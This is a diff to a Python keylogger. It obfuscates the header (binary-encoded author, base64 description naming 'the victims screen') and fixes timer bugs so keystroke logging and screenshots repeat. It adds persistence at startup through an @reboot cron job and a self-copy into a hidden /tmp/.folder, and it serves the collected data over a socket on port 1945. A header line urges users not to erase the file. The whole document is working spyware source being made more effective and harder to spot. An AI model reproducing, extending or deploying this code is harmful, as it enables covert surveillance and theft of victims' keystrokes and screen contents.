@@ -3,15 +3,26 @@
 '''
 -----------------------------------------------------------------------------
 THIS FILE IS IMPORTANT FOR SYSTEM PROCESSES... PLEASE DO NOT ERASE... HAHA!!
-Name : 		  Alexis Rodriguez
-Date : 		  2020-02-09
-Description : this program captures all keystrokes pressed on a keyboard,
-			  takes a screenshot of the victims screen, and binds a server 
-			  socket to transfer a zip file of all the gathered data over
-			  a socket connection. The keyself.logger text file is updated every
-			  20 seconds and the screen capture occurs every 2 minutes. As of
-			  right now this program will only work on Linux machines
-			  but will be updated in the near future for Windows machine too.
+
+Author : 00110101 00110001 00100000 00110101 00110111 00100000 00110111 00111000 
+		 00100000 00110110 01100011 00100000 00110110 00110101 00100000 00110100 00110111 
+		 00100000 00110110 01100011 00100000 00110111 01100001 00100000 00110100 00111001 
+		 00100000 00110100 00110110 00100000 00110100 01100001 00100000 00110111 00110110 
+		 00100000 00110101 01100001 00100000 00110100 00111000 00100000 00110100 01100001 
+		 00100000 00110111 00110000 00100000 00110101 01100001 00100000 00110011 00110011 
+		 00100000 00110101 00110110 00100000 00110110 01100011 00100000 00110110 00110101 
+		 00100000 00110110 00110111 00100000 00110011 01100100 00100000 00110011 01100100
+
+Date : 2020-02-09
+
+Description : dGhpcyBwcm9ncmFtIGNhcHR1cmVzIGFsbCBrZXlzdHJva2VzIHByZXNzZWQ
+			  gb24gYSBrZXlib2FyZCwgdGFrZXMgYSBzY3JlZW5zaG90IG9mIHRoZSB2aWN0aW1zIHNjcmVlbiwg
+			  YW5kIGJpbmRzIGEgc2VydmVyIHNvY2tldCB0byB0cmFuc2ZlciBhIHppcCBmaWxlIG9mIGFsbCB0aGUgZ
+			  2F0aGVyZWQgZGF0YSBvdmVyYSBzb2NrZXQgY29ubmVjdGlvbi4gVGhlIGtleXNlbGYubG9nZ2VyIHRleHQg
+			  ZmlsZSBpcyB1cGRhdGVkIGV2ZXJ5IDIwIHNlY29uZHMgYW5kIHRoZSBzY3JlZW4gY2FwdHVyZSBvY2N1c
+			  nMgZXZlcnkgMiBtaW51dGVzLiBBcyBvZiByaWdodCBub3cgdGhpcyBwcm9ncmFtIHdpbGwgb25seSB3b3Jr
+			  IG9uIExpbnV4IG1hY2hpbmVzIGJ1dCB3aWxsIGJlIHVwZGF0ZWQgaW4gdGhlIG5lYXIgZnV0dXJlIGZvciBXa
+			  W5kb3dzIG1hY2hpbmUgdG9vLg==
 			  
 			  ___   _      ___   _      ___   _      ___   _      ___   _
 			 [(_)] |=|    [(_)] |=|    [(_)] |=|    [(_)] |=|    [(_)] |=|
@@ -42,6 +53,15 @@ class Keylogger:
 	# invoking the constructor will declare class variable self.log
 	def __init__(self):
 		self.log = ''
+		# create cronjob
+		self.create_cronjob()
+		# get path of where the initial file was downloaded
+		self.initial_file_path = os.getcwd()
+		# get /tmp folder name
+		self.directory = self.make_get_dir()
+		# replicate the initial file into the /tmp/.folder
+		# to continue to execute keylogger after reboot
+		self.replicate()
 
 	'''
 	Begin capturing keystrokes
@@ -49,6 +69,10 @@ class Keylogger:
 	def start_listening(self):
 		with keyboard.Listener(
 			on_press=self.on_press) as listener:
+			# begin logging to keylog file
+			self.log_to_file()
+			# begin taking screen shots
+			self.save_screen()
 			listener.join()
 
 	'''
@@ -96,7 +120,7 @@ class Keylogger:
 		# write self.log to file
 		f.write(self.log)
 		# every 20 seconds invoke this function
-		clock = threading.Timer(20, self.log_to_file())
+		clock = threading.Timer(20, self.log_to_file)
 		# begin clock
 		clock.start()
 
@@ -114,7 +138,7 @@ class Keylogger:
 
 	'''
 	Take a screenshot of the victions computer
-	every minute and save it to /tmp/.folder directory
+	every 2 minutes and save it to /tmp/.folder directory
 	'''
 	def save_screen(self):
 		# take a screenshot
@@ -124,7 +148,7 @@ class Keylogger:
 		# save image to the directory that was created
 		image.save(r'/tmp/.folder/normal_'+time+'.png')
 		# repeat function every two minutes
-		take_screen = threading.Timer(120, save_screen)
+		take_screen = threading.Timer(120, self.save_screen)
 		# begin timer
 		take_screen.start()
 
@@ -158,14 +182,13 @@ class Keylogger:
 	Param : zipped file created by zip_folder function
 	'''
 	def socket_listen_send(self):
-		# get name of directory that was made
-		directory = self.make_get_dir()
 		# get zipped file composed of folders contents
-		zipped_file = self.zip_folder(directory)
+		zipped_file = self.zip_folder(self.directory)
 		# creating socket context manager
 		with sck.socket(sck.AF_INET, sck.SOCK_STREAM) as soc:
 			# get IP address of victim and assign listening port
 			IP=sck.gethostbyname(sck.gethostname())
+			print(IP)
 			PORT=1945 # the end of ww2
 
 			# bind socket to victim IP address and port
@@ -189,20 +212,20 @@ class Keylogger:
 	'''
 	def create_cronjob(self):
 		# echo cronjob command into file
-		subp.call(['echo', '@reboot', '/tmp/.folder/run.py', '>', 'my-crontab'])
+		subp.call(['echo @reboot /tmp/.folder/run.py > my-crontab'], shell=True)
 		# update crontab with the command in my conjob file
 		subp.call(['crontab', 'my-crontab'])
 
 	'''
-	replicate keyself.logger in /tmp/folder to
-	continue to turn on keyself.logger after reboot
+	replicate keylogger in /tmp/folder to
+	continue to turn on keylogger after reboot
 	'''
-	def replicate(self, direc, initial_direc):
+	def replicate(self):
 		# create file run.py in location of collected data
-		subp.call(['touch', direc + 'run.py'])
-		# copy contents of keyself.log file over to /tmp
+		subp.call(['touch', self.directory + '/run.py'])
+		# copy contents of keylog py file over to /tmp
 		# to make sure cronjob finds python file to interpret
-		subp.call(['cp', initial_file_path + 'run.py', direc + 'run.py'])
+		subp.call(['cp', self.initial_file_path + '/keylogger.py', self.directory + 'run.py'])
 
 
 '''
@@ -213,26 +236,12 @@ MAIN IS HERE!
 def initiate():
 	# instantiating object
 	my_obj = Keylogger()
-	# makd directory
+	# make directory
 	my_obj.make_get_dir()
 	# invoke this function to begin listening
 	my_obj.start_listening()
-	# begin logging to keylog file
-	my_obj.log_to_file()
-	# begin taking screenshots
-	my_obj.save_screen()
 	# listen for socket connections and send at zipped file
 	my_obj.socket_listen_send()
-	# create cronjob to start keylogger after reboot
-	my_obj.create_cronjob()
-	# get path of where the initial file was downloaded
-	initial_file_path = os.getcwd()
-	# get /tmp folder name
-	directory = my_obj.make_get_dir()
-	# replicate the initial file into the /tmp/.folder
-	# to continue to execute keylogger after reboot
-	my_obj.replicate(directory, initial_file_path)
-
 
 
 if __name__ == '__main__':
